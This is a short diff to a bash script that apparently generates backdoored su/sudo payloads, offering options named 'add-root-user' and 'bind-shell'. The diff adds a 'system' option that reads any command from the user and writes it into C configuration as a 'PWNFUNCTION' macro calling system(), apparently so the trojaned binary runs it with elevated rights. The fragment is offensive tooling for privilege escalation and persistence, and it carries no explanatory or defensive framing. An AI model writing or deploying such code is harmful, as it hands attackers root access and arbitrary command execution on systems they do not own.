@@ -1,7 +1,14 @@
 #!/bin/bash
 
-fun=(add-root-user bind-shell)
+fun=(add-root-user bind-shell system)
 programs=(su sudo)
+
+system()
+{
+	read -p "command to execute: " cmd
+	config+=("#include <stdlib.h>")
+	config+=("#define PWNFUNCTION system(\"$cmd\");")
+}
 
 add_root_user()
 {
